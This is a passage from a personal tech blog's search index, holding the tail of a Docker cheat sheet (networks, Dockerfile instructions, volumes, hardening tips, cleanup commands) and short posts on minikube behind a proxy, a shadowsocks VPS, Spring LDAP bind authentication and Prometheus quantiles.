my_image:my_tag Export an existing container: docker export my_container | gzip &gt; my_container.tar.gz Difference between loading a saved image and importing an exported container as an image Loading an image using the load command creates a new image including its history. Importing a container as an image using the import command creates a new image excluding the history which results in a smaller image size compared to loading an image. Networks Docker has a networks feature. Not much is known about it, so this is a good place to expand the cheat sheet. There is a note saying that it's a good way to configure docker containers to talk to each other without using ports. See working with networks for more details. Lifecycle docker network create docker network rm Info docker network ls docker network inspect Connection docker network connect docker network disconnect You can specify a specific IP address for a container: # create a new bridge network with your subnet and gateway for your ip block docker network create --subnet 203.0.113.0/24 --gateway 203.0.113.254 iptastic run a nginx container with a specific ip in that block $ docker run --rm -it --net iptastic --ip 203.0.113.2 nginx curl the ip from any other place (assuming this is a public ip block duh) $ curl 203.0.113.2 Registry &amp; Repository A repository is a hosted collection of tagged images that together create the file system for a container. A registry is a host -- a server that stores repositories and provides an HTTP API for managing the uploading and downloading of repositories. Docker.com hosts its own index to a central registry which contains a large number of repositories. Having said that, the central docker registry does not do a good job of verifying images and should be avoided if you're worried about security. docker login to login to a registry. docker logout to logout from a registry. docker search searches registry for image. docker pull pulls an image from registry to local machine. docker push pushes an image to the registry from local machine. Run local registry You can run a local registry by using the docker distribution project and looking at the local deploy instructions. Also see the mailing list. Dockerfile The configuration file. Sets up a Docker container when you run docker build on it. Vastly preferable to docker commit. Here are some common text editors and their syntax highlighting modules you could use to create Dockerfiles: If you use jEdit, I've put up a syntax highlighting module for Dockerfile you can use. Sublime Text 2 Atom Vim Emacs TextMate VS Code Also see Docker meets the IDE Instructions .dockerignore FROM Sets the Base Image for subsequent instructions. MAINTAINER (deprecated - use LABEL instead) Set the Author field of the generated images. RUN execute any commands in a new layer on top of the current image and commit the results. CMD provide defaults for an executing container. EXPOSE informs Docker that the container listens on the specified network ports at runtime. NOTE: does not actually make ports accessible. ENV sets environment variable. ADD copies new files, directories or remote file to container. Invalidates caches. Avoid ADD and use COPY instead. COPY copies new files or directories to container. Note that this only copies as root, so you have to chown manually regardless of your USER / WORKDIR setting. See https://github.com/moby/moby/issues/30110 ENTRYPOINT configures a container that will run as an executable. VOLUME creates a mount point for externally mounted volumes or other containers. USER sets the user name for following RUN / CMD / ENTRYPOINT commands. WORKDIR sets the working directory. ARG defines a build-time variable. ONBUILD adds a trigger instruction when the image is used as the base for another build. STOPSIGNAL sets the system call signal that will be sent to the container to exit. LABEL apply key/value metadata to your images, containers, or daemons. Tutorial Flux7's Dockerfile Tutorial Examples Examples Best practices for writing Dockerfiles Michael Crosby has some more Dockerfiles best practices / take 2. Building Good Docker Images / Building Better Docker Images Managing Container Configuration with Metadata Layers The versioned filesystem in Docker is based on layers. They're like git commits or changesets for filesystems. Links Links are how Docker containers talk to each other through TCP/IP ports. Linking into Redis and Atlassian show worked examples. You can also resolve links by hostname. This has been deprected to some extent by user-defined networks. NOTE: If you want containers to ONLY communicate with each other through links, start the docker daemon with -icc=false to disable inter process communication. If you have a container with the name CONTAINER (specified by docker run --name CONTAINER) and in the Dockerfile, it has an exposed port: EXPOSE 1337 Then if we create another container called LINKED like so: docker run -d --link CONTAINER:ALIAS --name LINKED user/wordpress Then the exposed ports and aliases of CONTAINER will show up in LINKED with the following environment variables: $ALIAS_PORT_1337_TCP_PORT $ALIAS_PORT_1337_TCP_ADDR And you can connect to it that way. To delete links, use docker rm --link. Generally, linking between docker services is a subset of &quot;service discovery&quot;, a big problem if you're planning to use Docker at scale in production. Please read The Docker Ecosystem: Service Discovery and Distributed Configuration Stores for more info. Volumes Docker volumes are free-floating filesystems. They don't have to be connected to a particular container. You should use volumes mounted from data-only containers for portability. Lifecycle docker volume create docker volume rm Info docker volume ls docker volume inspect Volumes are useful in situations where you can't use links (which are TCP/IP only). For instance, if you need to have two docker instances communicate by leaving stuff on the filesystem. You can mount them in several docker containers at once, using docker run --volumes-from. Because volumes are isolated filesystems, they are often used to store state from computations between transient containers. That is, you can have a stateless and transient container run from a recipe, blow it away, and then have a second instance of the transient container pick up from where the last one left off. See advanced volumes for more details. Container42 is also helpful. You can map MacOS host directories as docker volumes: docker run -v /Users/wsargent/myapp/src:/src You can use remote NFS volumes if you're feeling brave. You may also consider running data-only containers as described here to provide some data portability. Be aware that you can mount files as volumes. Exposing ports Exposing incoming ports through the host container is fiddly but doable. This is done by mapping the container port to the host port (only using localhost interface) using -p: docker run -p 127.0.0.1:$HOSTPORT:$CONTAINERPORT --name CONTAINER -t someimage You can tell Docker that the container listens on the specified network ports at runtime by using EXPOSE: EXPOSE &lt;CONTAINERPORT&gt; Note that EXPOSE does not expose the port itself -- only -p will do that. To expose the container's port on your localhost's port: iptables -t nat -A DOCKER -p tcp --dport &lt;LOCALHOSTPORT&gt; -j DNAT --to-destination &lt;CONTAINERIP&gt;:&lt;PORT&gt; If you're running Docker in Virtualbox, you then need to forward the port there as well, using forwarded_port. Define a range of ports in your Vagrantfile like this so you can dynamically map them: Vagrant.configure(VAGRANTFILE_API_VERSION) do |config| ... (49000..49900).each do |port| config.vm.network :forwarded_port, :host =&gt; port, :guest =&gt; port end ... end If you forget what you mapped the port to on the host container, use docker port to show it: docker port CONTAINER $CONTAINERPORT Best Practices This is where general Docker best practices and war stories go: The Rabbit Hole of Using Docker in Automated Tests Bridget Kromhout has a useful blog post on running Docker in production at Dramafever. There's also a best practices blog post from Lyst. Building a Development Environment With Docker Discourse in a Docker Container Security This is where security tips about Docker go. The Docker security page goes into more detail. First things first: Docker runs as root. If you are in the docker group, you effectively have root access. If you expose the docker unix socket to a container, you are giving the container root access to the host. Docker should not be your only defense. You should secure and harden it. For an understanding of what containers leave exposed, you should read Understanding and Hardening Linux Containers by Aaron Grattafiori. This is a complete and comprehensive guide to the issues involved with containers, with a plethora of links and footnotes leading on to yet more useful content. The security tips following are useful if you've already hardened containers in the past, but are not a substitute for understanding. Security Tips For greatest security, you want to run Docker inside a virtual machine. This is straight from the Docker Security Team Lead -- slides / notes. Then, run with AppArmor / seccomp / SELinux / grsec etc to limit the container permissions. See the Docker 1.10 security features for more details. Docker image ids are sensitive information and should not be exposed to the outside world. Treat them like passwords. See the Docker Security Cheat Sheet by Thomas Sjögren: some good stuff about container hardening in there. Check out the docker bench security script, download the white papers and subscribe to the mailing lists (unfortunately Docker does not have a unique mailing list, only dev / user). You should start off by using a kernel with unstable patches for grsecurity / pax compiled in, such as Alpine Linux. If you are using grsecurity in production, you should spring for commercial support for the stable patches, same as you would do for RedHat. It's $200 a month, which is nothing to your devops budget. Since docker 1.11 you can easily limit the number of active processes running inside a container to prevent fork bombs. This requires a linux kernel &gt;= 4.3 with CGROUP_PIDS=y to be in the kernel configuration. docker run --pids-limit=64 Also available since docker 1.11 is the ability to prevent processes from gaining new privileges. This feature have been in the linux kernel since version 3.5. You can read more about it in this blog post. docker run --security-opt=no-new-privileges From the Docker Security Cheat Sheet (it's in PDF which makes it hard to use, so copying below) by Container Solutions: Turn off interprocess communication with: docker -d --icc=false --iptables Set the container to be read-only: docker run --read-only Verify images with a hashsum: docker pull debian@sha256:a25306f3850e1bd44541976aa7b5fd0a29be Set volumes to be read only: docker run -v $(pwd)/secrets:/secrets:ro debian Define and run a user in your Dockerfile so you don't run as root inside the container: RUN groupadd -r user &amp;&amp; useradd -r -g user user USER user User Namespaces There's also work on user namespaces -- it is in 1.10 but is not enabled by default. To enable user namespaces (&quot;remap the userns&quot;) in Ubuntu 15.10, follow the blog example. Security Videos Using Docker Safely Securing your applications using Docker Container security: Do containers actually contain? Linux Containers: Future or Fantasy? Security Roadmap The Docker roadmap talks about seccomp support. There is an AppArmor policy generator called bane, and they're working on security profiles. Tips Sources: 15 Docker Tips in 5 minutes CodeFresh Everyday Hacks Docker Prune The new Data Management Commands have landed as of Docker 1.13: docker system prune docker volume prune docker network prune docker container prune docker image prune df docker system df presents a summary of the space currently used by different docker objects. Heredoc Docker Container docker build -t htop - &lt;&lt; EOF FROM alpine RUN apk --no-cache add htop EOF Last Ids alias dl='docker ps -l -q' docker run ubuntu echo hello world docker commit $(dl) helloworld Commit with command (needs Dockerfile) docker commit -run='{&quot;Cmd&quot;:[&quot;postgres&quot;, &quot;-too -many -opts&quot;]}' $(dl) postgres Get IP address docker inspect $(dl) | grep -wm1 IPAddress | cut -d '&quot;' -f 4 or install jq: docker inspect $(dl) | jq -r '.[0].NetworkSettings.IPAddress' or using a go template: docker inspect -f '' &lt;container_name&gt; or when building an image from Dockerfile, when you want to pass in a build argument: DOCKER_HOST_IP=`ifconfig | grep -E &quot;([0-9]{1,3}  .){3}[0-9]{1,3}&quot; | grep -v 127.0.0.1 | awk '{ print $2 }' | cut -f2 -d: | head -n1` echo DOCKER_HOST_IP = $DOCKER_HOST_IP docker build    --build-arg ARTIFACTORY_ADDRESS=$DOCKER_HOST_IP -t sometag    some-directory/ Get port mapping docker inspect -f ' -&gt; ' &lt;containername&gt; Find containers by regular expression for i in $(docker ps -a | grep &quot;REGEXP_PATTERN&quot; | cut -f1 -d&quot; &quot;); do echo $i; done Get Environment Settings docker run --rm ubuntu env Kill running containers docker kill $(docker ps -q) Delete all containers (force!! running or stopped containers) docker rm -f $(docker ps -qa) Delete old containers docker ps -a | grep 'weeks ago' | awk '{print $1}' | xargs docker rm Delete stopped containers docker rm -v $(docker ps -a -q -f status=exited) Delete containers after stopping docker stop $(docker ps -aq) &amp;&amp; docker rm -v $(docker ps -aq) Delete dangling images docker rmi $(docker images -q -f dangling=true) Delete all images docker rmi $(docker images -q) Delete dangling volumes As of Docker 1.9: docker volume rm $(docker volume ls -q -f dangling=true) In 1.9.0, the filter dangling=false does not work - it is ignored and will list all volumes. Show image dependencies docker images -viz | dot -Tpng -o docker.png Slimming down Docker containers Cleaning APT in a RUN layer This should be done in the same layer as other apt commands. Otherwise, the previous layers still persist the original information and your images will still be fat. RUN {apt commands}    &amp;&amp; apt-get clean    &amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* Flatten an image ID=$(docker run -d image-name /bin/bash) docker export $ID | docker import – flat-image-name For backup ID=$(docker run -d image-name /bin/bash) (docker export $ID | gzip -c &gt; image.tgz) gzip -dc image.tgz | docker import - flat-image-name Monitor system resource utilization for running containers To check the CPU, memory, and network I/O usage of a single container, you can use: docker stats &lt;container&gt; For all containers listed by id: docker stats $(docker ps -q) For all containers listed by name: docker stats $(docker ps --format '') For all containers listed by image: docker ps -a -f ancestor=ubuntu Remove all untagged images docker rmi $(docker images | grep “^” | awk “{print $3}”) Remove container by a regular expression docker ps -a | grep wildfly | awk '{print $1}' | xargs docker rm -f Remove all exited containers docker rm -f $(docker ps -a | grep Exit | awk '{ print $1 }') Volumes can be files Be aware that you can mount files as volumes. For example you can inject a configuration file like this: # copy file from container docker run --rm httpd cat /usr/local/apache2/conf/httpd.conf &gt; httpd.conf # edit file vim httpd.conf # start container with modified configuration docker run --rm -ti -v &quot;$PWD/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro&quot; -p &quot;80:80&quot; httpd Contributing Here's how to contribute to this cheat sheet. Open README.md Click README.md &lt;-- this link Edit Page Make Changes and Commit ",
      "url"      : "http://localhost:4000/2018/04/30/docker-cheat-sheet/"
    } ,
  
    {
      "title"    : "Mac Minikube Install",
      "category" : "",
      "content": "MBP install minikube 背景 MBP can access google via shadowsocks locally. 本来想用mac docker-for-desktop方案，参考https://github.com/maguowei/k8s-docker-for-mac，没有成功。最后还是用minikube方案。 参考了minikube官网手册，https://kubernetes.io/docs/getting-started-guides/minikube/， 但是在下面这一步时一直过不去 curl $(minikube service hello-minikube --url) 通过查看minikube日志,发现应该是kube组件不能访问google。 minikube logs E0430 13:25:24.853253 2025 kubelet_node_status.go:106] Unable to register node &quot;docker-for-desktop&quot; with API server: Post https://192.168.65.3:6443/api/v1/nodes: dial tcp 192.168.65.3:6443: getsockopt: connection refused 前提 安装hyperkit driver installation curl -LO https://storage.googleapis.com/minikube/releases/latest/docker-machine-driver-hyperkit    &amp;&amp; chmod +x docker-machine-driver-hyperkit    &amp;&amp; sudo mv docker-machine-driver-hyperkit /usr/local/bin/    &amp;&amp; sudo chown root:wheel /usr/local/bin/docker-machine-driver-hyperkit    &amp;&amp; sudo chmod u+s /usr/local/bin/docker-machine-driver-hyperkit 安装privoxy privoxy作用是socks5转http代理。minikube支持的是http代理，我们访问google用的是shadowsocks sock5.所以需要做一次转换。参考（https://javasgl.github.io/transfer_socks5_to_http_proxy/） vim /usr/local/etc/privoxy/config 这里需要特别注意的是地址192.168.64.1必须是host本机提供给minikube的那个ip（相当与网关,其他ip地址貌似不行）。可以通过 minikube ip 命令得到kube ip，再从hostifconfig中找出对应的host ip。 forward-socks5 / 127.0.0.1:1080 . listen-address 192.168.64.1:8118 MBP环境下安装过程中如果遇到下面异常 Warning: privoxy 3.0.26 is already installed, it's just not linked You can use `brew link privoxy` to link this version. ╭─Donghua@ ~ ╰─$ brew link privoxy Linking /usr/local/Cellar/privoxy/3.0.26... Error: Could not symlink sbin/privoxy /usr/local/sbin is not writable. 可以通过下面方式解决 sudo mkdir /usr/local/sbin sudo chown -R `whoami`:admin /usr/local/sbin 注意这里不用启动privoxy，只需要配置好。下一步minikube start的时候会自动启动privoxy 关键步骤 # 清理 minikube delete # 启动 minikube start --docker-env http_proxy='http://192.168.64.1:8118' --docker-env https_proxy='http://192.168.64.1:8118' --vm-driver=hyperkit export no_proxy=$no_proxy,$(minikube ip) # 验证 curl $(minikube service hello-minikube --url) minikube dashboard ",
      "url"      : "http://localhost:4000/2018/05/01/mac-minikube-install/"
    } ,
  
    {
      "title"    : "Jdk8 Upgrade",
      "category" : "",
      "content": "jdk6 升级到 jdk8 注意事项 二进制兼容 源代码兼容 中间件（tomcat/spring）开源库版本升级 jvm启动参数permSize-&gt;meta space spring3 -&gt; spring 4 代码覆盖率工具 emma -&gt; Jacoco 通过设置 GC 停顿的期望时间来调优(-XX:MaxGCPauseMillis) jersey client 1.19 -&gt; 2.x (DK1.7以上才可以使用Jersey 2.X) G1 GC（适用于大内存/对延迟要求高于吞吐的场景） ",
      "url"      : "http://localhost:4000/2018/05/11/jdk8-upgrade/"
    } ,
  
    {
      "title"    : "程序员Mac环境下的文本编辑器",
      "category" : "文本编辑器",
      "content": "window下用UE，editor++，记事本等，转到mac下开发后经常发现存点东西很不方便。经同事推荐分别试用了ATOM和Visual Studio Code。 ATOM 一开始试用的是ATOM，因为github渊源。样式定义也很方便大气，唯一不爽的是命令行集成的不是很好。 Visual Studio Code 一次在看youtube视频的时候，看见牛人demo代码时用的VSC，感觉不错。赶紧下一个，并使用了命令行功能。不能不说微软相关的东西很是好用，老一代人visual studio 6.0的记忆啊。（虽然我不确定这个VSC跟微软是否有关） 目前倾向于使用VSC ：） ",
      "url"      : "http://localhost:4000/2018/05/19/programmer-txt-editor/"
    } ,
  
    {
      "title"    : "vps + shadowsocks 上网",
      "category" : "shadowsocks，上网，vps",
      "content": "vps vps 可以从vultr购买，5美元一个月，ubuntu日本（1CPU，1G内存，25G SSD，1000G网络带宽/月），访问速度还行。 shadowsocks vps上安装shadowsocks服务端 apt-get update apt-get install python-pip pip install --upgrade pip pip install setuptools pip install shadowsocks vim /etc/shadowsocks.json chmod 755 /etc/shadowsocks.json apt-get install python-m2crypto ssserver -c /etc/shadowsocks.json -d start ssserver -c /etc/shadowsocks.json -d stop shadowsocks.json {  &quot;server&quot;:&quot;0.0.0.0&quot;,  &quot;server_port&quot;:1024,  &quot;local_address&quot;: &quot;127.0.0.1&quot;,  &quot;local_port&quot;:1080,  &quot;password&quot;:&quot;mypassword&quot;,  &quot;timeout&quot;:300,  &quot;method&quot;:&quot;aes-256-cfb&quot; } 客户端安装shadowsocks客户端 参考 https://www.flyzy2005.com/fan-qiang/shadowsocks/build-shadowsocks-on-vps/ ",
      "url"      : "http://localhost:4000/2018/05/19/vps-shadowsocks/"
    } ,
  
    {
      "title"    : "kube proxy",
      "category" : "k8s",
      "content": "kube-proxy All of the worker nodes run a daemon called kube-proxy, which watches the API server on the master node for the addition and removal of Services and endpoints. For each new Service, on each node, kube-proxy configures the iptables rules to capture the traffic for its ClusterIP and forwards it to one of the endpoints. When the service is removed, kube-proxy removes the iptables rules on all nodes as well. ",
      "url"      : "http://localhost:4000/2018/05/24/kube-proxy/"
    } ,
  
    {
      "title"    : "k8s存储",
      "category" : "k8s",
      "content": " ",
      "url"      : "http://localhost:4000/2018/05/26/kube-storage/"
    } ,
  
    {
      "title"    : "Spring LDAP 认证",
      "category" : "Spring LDAP",
      "content": "Spring提供了专门的LDAP集成库和解决方案。参考：https://spring.io/guides/gs/authenticating-ldap/ 参考用户文档中容易产生一个误区。 @Configuration public class WebSecurityConfig extends WebSecurityConfigurerAdapter { &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;configure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpSecurity&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;authorizeRequests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;anyRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fullyAuthenticated&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;formLogin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;configure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;AuthenticationManagerBuilder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ldapAuthentication&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;userDnPatterns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;uid={0},ou=people&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;groupSearchBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ou=groups&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contextSource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;  t t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ldap://localhost:8389/dc=springframework,dc=org&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;passwordCompare&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;  t t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;passwordEncoder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LdapShaPasswordEncoder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;  t t t t&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;passwordAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;userPassword&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 上面参考代码中下面这部分是不合适的。首先LdapShaPasswordEncoder是deperacated类不推荐使用；其次这种LDAP认证方式会把LDAP当作一个存用户信息的数据库，而不是认证服务器。因为他是先根据用户id从LDAP中查询用户对象，获取后再取出用户密码跟前端传过来的进行比对（当然密码存储不是明文，会做单向加密）。  t t t t t.and()  t t t t.passwordCompare()  t t t t t.passwordEncoder(new LdapShaPasswordEncoder())  t t t t t.passwordAttribute(userPassword); 理想中的情况是我们把前端输入的用户名和密码透传给LDAP，由LDAP完成认证服务，应用服务器并不用关心LDAP密码加密方式等。 其实Spring LDAP本身就支持这种认证方式。这里就要区别BindAuthenticator 和 PasswordComparisonAuthenticator。上面的就是PasswordComparisonAuthenticator方式。那么怎么让WebSecurityConfigurerAdapter支持BindAuthenticator呢？ 很简单，去掉上面passwordEncoder就会应用BindAuthenticator。而且上面的配置中并不需要提及userPassword。因为BindAuthenticator会中上下文中的authentication对象中获取。Authentication会从basic auth popup form中获取用户名，密码信息。 相关逻辑参考spring 源码如下： @Override  public void configure(AuthenticationManagerBuilder auth) throws Exception {  auth    .ldapAuthentication(); // 入口处  t}  t&lt;span class=&quot;cm&quot;&gt;/** * Creates the {@link LdapAuthenticator} to use * * @param contextSource the {@link BaseLdapPathContextSource} to use * @return the {@link LdapAuthenticator} to use */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LdapAuthenticator&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;createLdapAuthenticator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;  t t&lt;span class=&quot;nc&quot;&gt;BaseLdapPathContextSource&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contextSource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;AbstractLdapAuthenticator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ldapAuthenticator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwordEncoder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;createBindAuthenticator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;contextSource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t t&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;createPasswordCompareAuthenticator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;contextSource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;·&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;LdapUserSearch&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userSearch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;createUserSearch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userSearch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;ldapAuthenticator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setUserSearch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userSearch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userDnPatterns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userDnPatterns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;ldapAuthenticator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setUserDnPatterns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userDnPatterns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;postProcess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ldapAuthenticator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; ",
      "url"      : "http://localhost:4000/2018/05/28/spring-ldap/"
    } ,
  
    {
      "title"    : "prometheus quantile",
      "category" : "prometheus quantile 分位数",
      "content": "histogram Imagine that you create a histogram with 5 buckets with values: 0.5, 1, 2, 3, 5. Let’s call this histogram http_request_duration_seconds and 3 requests come in with durations 1s, 2s, 3s. Then you would see that /metrics endpoint contains: HELP http_request_duration_seconds request duration histogram TYPE http_request_duration_seconds histogram http_request_duration_seconds_bucket{le=&quot;0.5&quot;} 0 http_request_duration_seconds_bucket{le=&quot;1&quot;} 1 http_request_duration_seconds_bucket{le=&quot;2&quot;} 2 http_request_duration_seconds_bucket{le=&quot;3&quot;} 3 http_request_duration_seconds_bucket{le=&quot;5&quot;} 3 http_request_duration_seconds_bucket{le=&quot;+Inf&quot;} 3 http_request_duration_seconds_sum 6 http_request_duration_seconds_count 3 Here we can see that: sum is 1s + 2s + 3s = 6, count is 3, because of 3 requests bucket {le=”0.5″} is 0, because none of the requests where &lt;= 0.5 seconds average http_request_duration_seconds_sum / http_request_duration_seconds_count quantile, Which results in 1.5. histogram_quantile(0.5, rate(http_request_duration_seconds_bucket[10m]) 注意这里算出来的quantile跟下面的并不一致（不是2），解释是这里是近似值。参考：https://povilasv.me/prometheus-tracking-request-duration/ summary http_request_duration_seconds{quantile=&quot;0.5&quot;} 2 http_request_duration_seconds{quantile=&quot;0.9&quot;} 3 http_request_duration_seconds{quantile=&quot;0.99&quot;} 3 http_request_duration_seconds_sum 6 http_request_duration_seconds_count 3 So we can see that: sum is 1s + 2s + 3s = 6, count is 3, because of 3 requests. {quantile=”0.5″} is 2, meaning 50th percentile is 2. 分位数 - quantile 